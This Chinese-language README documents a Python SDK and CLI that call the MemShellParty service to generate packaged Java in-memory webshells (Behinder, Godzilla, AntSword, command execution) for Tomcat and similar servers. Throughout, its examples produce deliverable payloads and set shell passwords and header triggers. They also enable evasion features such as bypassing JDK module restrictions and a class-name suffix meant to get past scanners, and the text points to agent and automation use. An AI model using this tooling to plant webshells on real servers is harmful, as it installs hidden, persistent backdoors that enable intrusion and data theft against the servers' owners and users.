# wtfutil.memshellutil

面向 **Python SDK 调用者** 的说明：通过 HTTP 调用 [MemShellParty](https://github.com/ReaJason/MemShellParty) 服务，查询合法配置并生成 Java 内存马产物。

- 默认服务：[https://party.mem.mk](https://party.mem.mk)
- 上游议题：[Issue #143](https://github.com/ReaJason/MemShellParty/issues/143)
- 命令行另见文末「CLI」；日常脚本/业务代码请用本页的 `MemShellParty`。

**不做内置缓存。** 相同参数若需复用结果，请在调用方自行缓存（按请求体或业务键）。

---

## 快速上手

```python
from wtfutil.memshellutil import MemShellParty, MemShellPartyError

with MemShellParty() as client:
    result = client.generate(
        shell_tool="behinder",   # 不区分大小写
        shell_type="listener",
        jre=9,                   # Java/JRE 发行版本；≥9 时自动 byPassJavaModule=True
        password="example-pass",         # 通用密码 → behinderPass
        header_value="example-token",    # 请求头门槛（默认 header_name=User-Agent）
    )
    payload = result["packResult"]           # 打包后的可投递字符串
    info = result["memShellResult"]          # 类名、尺寸、连接参数等
    print(payload[:80], "...")
    print(info["shellClassName"], info["injectorClassName"])
```

SDK 符号从公开子模块导入：

```python
from wtfutil.memshellutil import MemShellParty
```

---

## 配置服务地址

解析优先级（后者覆盖前者，构造参数最高）：

1. 默认 `https://party.mem.mk`
2. `wtfconfig.ini` 的 `[memshell] BASE_URL`（经 [`configutil`](configutil.md)）
3. 环境变量 `MEMSHELL_BASE_URL`
4. 构造参数 `MemShellParty(base_url="https://...")`

```ini
# wtfconfig.ini
[memshell]
BASE_URL = https://party.mem.mk
```

```python
client = MemShellParty(base_url="http://127.0.0.1:8080", timeout=120)
```

模块级字典 `memshell_config` 会在客户端初始化时按 mtime 热更新；一般业务代码无需直接改它。

---

## 客户端生命周期

| 方式 | 说明 |
|------|------|
| `with MemShellParty() as client:` | 推荐；退出时关闭内部 session |
| `client = MemShellParty(); ...; client.close()` | 手动关闭 |
| `MemShellParty(session=已有session)` | 复用外部 session；`close()` **不会**关掉外部传入的 session |

常用构造参数：

| 参数 | 默认 | 说明 |
|------|------|------|
| `base_url` | 见上节 | 服务根地址（无尾斜杠亦可） |
| `timeout` | `60` | 单次请求超时（秒）；生成可能较慢，可酌情加大 |
| `session` | 内部新建 | `wtfutil.httputil` 的增强 Session；传入后由调用方管理重试策略 |
| `connect_retries` | `2` | 仅重试连接阶段失败；`0` 表示关闭 |
| `retry_backoff` | `0.25` | 连接重试退避因子，必须是有限的非负数 |

---

## API 一览

| 方法 | 作用 |
|------|------|
| `get_config()` | 查询「中间件 → 工具 → 挂载类型」合法组合 |
| `get_packers_tree()` | 查询可用 packer 树（打包格式） |
| `get_command_configs()` | Command 工具可用的加密器 / 执行实现 |
| `generate(body=None, **kwargs)` | 生成内存马并打包，返回完整 JSON |

### 先查再生成（推荐）

不确定目标环境支持哪些 `shell_tool` / `shell_type` 时，先拉配置：

```python
with MemShellParty() as client:
    cfg = client.get_config()
    # 形如：{ "Tomcat": { "Behinder": ["Listener", "Filter", ...], ... }, ... }
    tools = cfg["Tomcat"]
    print(sorted(tools.keys()))
    print(tools["Behinder"])

    packers = client.get_packers_tree()  # [{ "name": "...", "children": [...] }, ...]
    cmd = client.get_command_configs()  # encryptors / implementationClasses
```

非法组合会在 `generate` 时由服务端报错，SDK 转为 `MemShellPartyError`。

---

## generate：参数与默认值

`generate(**kwargs)` 使用 **snake_case**，SDK 会组装成官方 camelCase JSON。也可传入完整 `body=` 字典；与 kwargs 同时存在时，**body 深度合并覆盖** kwargs 结果。

`body` 必须是 JSON 对象；其中的 `shellConfig`、`shellToolConfig` 和 `injectorConfig` 也必须是对象。嵌套类型错误会在发送生成请求前直接抛出 `TypeError`。`extract_generate_meta()` 也会对响应中的对应字段执行相同的对象类型校验。

**大小写**：`server` / `shell_tool` / `shell_type` 在已知官方名称内**不区分大小写**（`tomcat` → `Tomcat`，`GODZILLA` → `Godzilla`）。未知名称原样上传。已知表可能滞后于上游，可用 `get_config()` / `memshell config` 核对。

### 内置默认（对齐官方常用 UI）

| 维度 | 默认值 |
|------|--------|
| 中间件 `server` | `Tomcat` |
| 工具 `shell_tool` | **`Behinder`（冰蝎）** |
| 挂载 `shell_type` | `Listener` |
| 目标运行时 `jre` | `6`（Java 6；常用另有 8 / 9 / 11 / 17 / 21 / 22） |
| `server_version` | `"unknown"`（多数场景不用改） |
| 缩小字节码 `shrink` | `True` |
| 静态初始化 `static_initialize` | `True` |
| 打包 `packer` | `DefaultBase64` |
| 入口头 `header_name` | `User-Agent` |
| `by_pass_java_module` | 未指定时：`jre ≥ 9` 自动 `True`，否则 `False` |

`shell_tool="Command"` 且未指定时：`encryptor="RAW"`，`implementation_class="RuntimeExec"`。

### 密码与请求头

| 写法 | 行为 |
|------|------|
| `password="example-pass"` | 按当前 `shell_tool` 映射到冰蝎 / 哥斯拉 / 蚁剑的 `*Pass` |
| `key="example-key"` | 写入哥斯拉 `godzillaKey`（其它工具一般无意义） |
| `behinder_pass` / `godzilla_pass` / `godzilla_key` / `ant_sword_pass` | 高级：专用字段优先于通用 `password` / `key`（日常用通用即可） |
| 密码类留空 | 服务端随机生成，结果在 `memShellResult.shellToolConfig` 中回传 |
| `header_name` + `header_value` | 匹配该请求头后才进入马逻辑；`header_value` 常需自行设定 |

```python
# 通用写法
client.generate(
    shell_tool="Behinder",
    password="example-pass",
    header_value="example-token",
)

# 哥斯拉
client.generate(
    shell_tool="Godzilla",
    shell_type="Filter",
    password="example-pass",
    key="example-key",
    header_value="example-token",
)

# 专用字段覆盖通用 password
client.generate(
    shell_tool="Behinder",
    password="example-unused-pass",
    behinder_pass="example-override-pass",
)
```

### 参数对照表

| kwargs | 官方字段 | 含义 |
|--------|----------|------|
| `server` | shellConfig.server | 目标中间件（不区分大小写）：Tomcat、Jetty、SpringWebMvc… |
| `server_version` | shellConfig.serverVersion | 服务版本；少数挂载因包名差异才需要 |
| `shell_tool` | shellConfig.shellTool | Behinder / Godzilla / Command…（不区分大小写） |
| `shell_type` | shellConfig.shellType | Listener / Filter / Valve…（不区分大小写） |
| `jre` | shellConfig.targetJreVersion | **推荐**：Java/JRE 发行版本 `6` / `8` / `9` / `11` / `17` / `21` / `22`；后续发行版按标准 `release + 44` 映射 |
| `target_jre_version` | 同上 | 高级兼容；可传发行版或官方 class 主版本；与 `jre` 同时出现时以 `jre` 为准。`body` 里的 `targetJreVersion` 按官方原样使用、不再换算 |
| `debug` | shellConfig.debug | 注入器打印注入信息，Shell 打印异常堆栈 |
| `by_pass_java_module` | shellConfig.byPassJavaModule | 绕过 JDK9+ 模块限制（Unsafe defineClass） |
| `shrink` | shellConfig.shrink | 缩小字节码（ASM SKIP_DEBUG）；默认 True |
| `probe` | shellConfig.probe | 回显探测：把注入器放入回显马，便于非本地确认 |
| `lambda_suffix` | shellConfig.lambdaSuffix | 类名追加 `$Proxy0$$Lambda$1`，利于绕过部分扫描 |
| `url_pattern` | injectorConfig.urlPattern | 挂载/匹配 URL，默认 `/*` |
| `injector_class_name` | injectorConfig.injectorClassName | 注入器全限定类名；空则随机 |
| `static_initialize` | injectorConfig.staticInitialize | 静态块调构造，适配 `Class.forName(..., true, ...)` |
| `shell_class_name` | shellToolConfig.shellClassName | Shell 全限定类名；空则随机 |
| `behinder_pass` | behinderPass | 高级：冰蝎密码（优先用 `password`） |
| `godzilla_pass` / `godzilla_key` | godzillaPass / godzillaKey | 高级：哥斯拉密码/密钥（优先用 `password` / `key`） |
| `ant_sword_pass` | antSwordPass | 高级：蚁剑密码（优先用 `password`） |
| `password` / `key` | （按工具映射） | **推荐**通用凭证 |
| `header_name` / `header_value` | headerName / headerValue | 入口特征请求头 |
| `command_param_name` | commandParamName | Command：命令参数名或头名 |
| `command_template` | commandTemplate | Command：模板，`{command}` 占位 |
| `encryptor` | encryptor | Command：RAW / BASE64 / DOUBLE_BASE64 |
| `implementation_class` | implementationClass | Command：RuntimeExec / ForkAndExec |
| `shell_class_base64` | shellClassBase64 | Custom：自定义 `.class` 的 Base64 |
| `packer` | packer | 打包格式（DefaultBase64、JSP、SpEL…） |

目标运行时是 JDK 9+ 时，传 `jre=9`（或更高），以便自动打开模块绕过。

---

## 返回值怎么用

`generate` 成功时返回 **dict**（完整服务端 JSON），常用字段：

| 键 | 用途 |
|----|------|
| `packResult` | 按 `packer` 打包后的主产物（字符串）；业务侧通常只关心这个 |
| `allPackResults` | 部分场景下的多格式产物（若有） |
| `memShellResult` | 元信息：类名、大小、最终 shellConfig / shellToolConfig / injectorConfig |

```python
result = client.generate(...)
payload = result["packResult"]

mem = result["memShellResult"]
print(mem["shellClassName"], mem["injectorClassName"])
print(mem["shellSize"], mem["injectorSize"])
print(mem["shellToolConfig"])  # 密码留空时会包含服务端生成的连接凭证
```

若只要紧凑元信息、不要大段 `packResult`，可用：

```python
from wtfutil.memshellutil import extract_generate_meta

meta = extract_generate_meta(result)
# shellClassName / injectorClassName / shellToolConfig / hasPackResult ...
```

---

## 更多示例

### 冰蝎 + Filter + 指定 packer

```python
with MemShellParty() as client:
    r = client.generate(
        server="Tomcat",
        shell_tool="Behinder",
        shell_type="Filter",
        jre=8,
        url_pattern="/*",
        password="example-pass",
        header_name="User-Agent",
        header_value="example-token",
        packer="DefaultBase64",
    )
    open("payload.txt", "w", encoding="utf-8").write(r["packResult"])
```

### Command 工具

```python
with MemShellParty() as client:
    opts = client.get_command_configs()
    r = client.generate(
        shell_tool="Command",
        shell_type="Listener",
        jre=9,
        command_param_name="cmd",
        encryptor="RAW",
        implementation_class="RuntimeExec",
        header_value="example-token",
    )
```

### 直接传官方 camelCase body

```python
body = {
    "shellConfig": {"server": "Tomcat", "shellTool": "Behinder", "shellType": "Listener"},
    "shellToolConfig": {
        "behinderPass": "example-pass",
        "headerValue": "example-token",
    },
    "injectorConfig": {"urlPattern": "/*"},
    "packer": "DefaultBase64",
}
# 仍会先按 kwargs 默认组装，再用 body 深度覆盖
result = client.generate(body=body, jre=9)
```

也可只组装请求体、稍后再发：

```python
from wtfutil.memshellutil import build_generate_body

req = build_generate_body(
    shell_tool="Godzilla",
    password="example-pass",
    key="example-key",
    header_value="example-token",
)
result = client.generate(body=req)
```

---

## 错误处理

失败时抛出 `MemShellPartyError`：

| 属性 | 含义 |
|------|------|
| `str(e)` / `args` | 固定错误类别与 HTTP 状态码；网络错误另含脱敏目标、异常类型和 errno 摘要 |
| `e.status_code` | HTTP 状态码（可能为 `None`） |
| `e.body` | 兼容属性；SDK 产生的错误保持为 `None`，不保存原始响应 |

```python
from wtfutil.memshellutil import MemShellParty, MemShellPartyError

try:
    with MemShellParty() as client:
        client.generate(shell_type="NotExist")
except MemShellPartyError as e:
    print(e, e.status_code)
```

常见原因：组合不合法、服务不可达、响应非 JSON、超时。HTTP 错误、非 JSON 响应和响应中的 `error` 字段只公开固定错误类别与状态码，不包含服务端原文或响应载荷。网络层 `requests` 异常统一包装为 `MemShellPartyError`；包装器会主动抑制原始异常上下文，避免 traceback 泄露凭证、请求体、代理详情或响应载荷。内部 session 默认仅重试连接阶段失败 2 次；不重试读取超时、HTTP 状态错误或响应解析错误。外部传入的 session 保留调用方自己的重试策略。内部重试策略同时兼容新旧 urllib3 的构造参数名称。

---

## 辅助符号

| 符号 | 说明 |
|------|------|
| `DEFAULT_BASE_URL` | 默认服务根地址常量 |
| `JRE_RELEASE_TO_CLASS` | JRE 发行版 → class 主版本映射（一般无需直接使用） |
| `KNOWN_SERVERS` / `KNOWN_SHELL_TOOLS` / `KNOWN_SHELL_TYPES` | 大小写归一用的已知名称表 |
| `canonicalize_server` / `canonicalize_shell_tool` / `canonicalize_shell_type` | 单独归一化 |
| `memshell_config` | 运行时配置 dict（`BASE_URL`） |
| `build_generate_body(...)` | 只组装请求体，不发 HTTP |
| `resolve_jre_class_version(...)` | 将 `jre`/发行版或 class 主版本统一为 API 数字 |
| `resolve_shell_credentials(...)` | 将 `password`/`key` 映射到专用凭证字段 |
| `extract_generate_meta(result, output=...)` | 从响应提取紧凑 meta |
| `MemShellPartyError` | API / 协议错误 |

---

## CLI（可选）

安装包后提供控制台命令 `memshell`。`wtfutil.memshell` 是 CLI 实现模块，不属于公开 SDK 子模块；Python 调用请使用 `wtfutil.memshellutil`，自动化或 Agent 场景也可直接使用 CLI。

```bash
memshell generate --help
memshell generate -o payload.txt
memshell generate --shell-tool Godzilla --shell-type Filter --jre 9 -o out.txt
memshell config
memshell packers
memshell install-skill --project
```

- **`-o PATH`**：文件只写 `packResult`；stdout 为 meta JSON。
- **无 `-o`**：stdout 完整响应 JSON。
- **`--jre`**：目标 Java 发行版本（6/8/9/11/17/21/22，后续版本也按标准映射）。
- **`--server` / `--shell-tool` / `--shell-type`**：已知名称内不区分大小写。
- 日常用 `--password` / `--key` 即可；专用 `*-pass` 与 `--target-jre-version` 仍可用但不在 `--help` 中展示。

参数与上表 kwargs 对应，详见 `memshell generate --help`。

---

## 测试

```bash
python -m unittest tests.test_memshell
# 联调用例默认跳过；需要时显式启用：
set MEMSHELL_RUN_LIVE=1
```
